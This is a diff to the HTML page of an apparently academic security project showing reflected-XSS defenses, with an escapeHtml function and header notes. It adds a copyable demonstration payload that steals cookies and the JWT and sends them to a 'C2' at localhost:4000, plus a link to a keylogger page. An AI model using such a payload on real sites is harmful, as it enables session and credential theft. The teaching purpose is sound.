@@ -18,6 +18,7 @@
         <a href="/search?q=">Busca</a>
         <a href="/reviews">Avaliações</a>
         <a href="/dom">DOM</a>
+        <a href="/keylog">Keylogger</a>
       </nav>
     </div>
   </header>
@@ -29,6 +30,15 @@
         <p>XSS Refletido — entrada refletida com escape de saída aplicado</p>
       </div>
       <span class="xss-type-badge">XSS REFLETIDO</span>
+    </div>
+
+    <div class="payload-box">
+      <div class="payload-box-header">
+        <span class="payload-box-title">⚡ Payload de demonstração — cole na barra de busca</span>
+        <button type="button" class="btn-copy" data-target="payload-reflected">Copiar</button>
+      </div>
+      <pre class="payload-code" id="payload-reflected">&lt;script&gt;new Image().src='http://localhost:4000/capture?type=reflected&amp;data='+encodeURIComponent(document.cookie)+'&amp;jwt='+encodeURIComponent(localStorage.getItem('token'))&lt;/script&gt;</pre>
+      <p class="payload-box-note">Refletido de volta na resposta da busca. Rouba cookie e JWT e envia ao C2 (:4000). Aqui o <code>escapeHtml</code> o transforma em texto antes de chegar ao HTML.</p>
     </div>
 
     <div class="search-wrapper">
@@ -66,6 +76,14 @@
           <div class="defense-info">
             <strong>Escape de Saída (Output Encoding)</strong>
             <span>A função <code>escapeHtml()</code> converte <code>&lt; &gt; &amp; " '</code> em entidades HTML antes de inserir no template.</span>
+            <pre class="code-block">function escapeHtml(str) {
+  return String(str)                    // ① garante que é texto
+    .replace(/&amp;/g, '&amp;amp;')             // ② troca  &amp;  por  &amp;amp;
+    .replace(/&lt;/g, '&amp;lt;')              // ③ troca  &lt;  por  &amp;lt;
+    .replace(/&gt;/g, '&amp;gt;')              // ④ troca  &gt;  por  &amp;gt;
+    .replace(/"/g, '&amp;quot;')            // ⑤ troca  "  por  &amp;quot;
+    .replace(/'/g, '&amp;#x27;');           // ⑥ troca  '  por  &amp;#x27;
+}</pre>
           </div>
         </div>
         <div class="defense-item">
@@ -78,8 +96,8 @@
         <div class="defense-item">
           <span class="check">✅</span>
           <div class="defense-info">
-            <strong>X-XSS-Protection</strong>
-            <span>Header ativado como camada adicional para browsers legados.</span>
+            <strong>X-XSS-Protection (legado)</strong>
+            <span>Header enviado apenas por compatibilidade com browsers antigos — os navegadores modernos removeram esse filtro. Não é uma defesa real hoje; quem protege de fato é o escape de saída + CSP acima.</span>
           </div>
         </div>
       </div>
@@ -89,5 +107,7 @@
   <footer>
     <p>Projeto Acadêmico — Segurança de Sistemas &nbsp;|&nbsp; OWASP Juice Shop Seguro</p>
   </footer>
+
+  <script src="/copy.js"></script>
 </body>
 </html>
